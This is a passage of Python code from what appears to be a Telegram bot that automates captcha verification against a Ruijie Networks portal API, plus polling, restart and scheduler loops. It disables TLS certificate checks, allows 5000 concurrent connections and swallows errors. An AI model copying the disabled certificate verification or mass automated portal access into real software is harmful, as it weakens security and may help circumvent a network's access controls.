        async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data, timeout=aiohttp.ClientTimeout(total=15)) as req:
            data = await req.json()
            if data.get("success") == True: return session_id
    except: pass
    return None

async def start_polling():
    backoff = 5
    await bot.remove_webhook()
    while True:
        try:
            print("Starting infinity polling...")
            await bot.infinity_polling(timeout=20, request_timeout=60)
        except Exception as e:
            print(f"Polling error: {e}. Reconnecting in {backoff}s...")
            await asyncio.sleep(backoff)
            backoff = min(backoff * 2, 60)

async def main():
    global session, _connector
    _connector = aiohttp.TCPConnector(limit=5000, ttl_dns_cache=300, ssl=False)
    session = aiohttp.ClientSession(connector=_connector, connector_owner=False, timeout=aiohttp.ClientTimeout(total=60))
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await start_polling()
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    while True:
        try:
            asyncio.run(main())
        except Exception as e:
            print(f"Main loop crash: {e}. Restarting in 5s...")
            time.sleep(5)
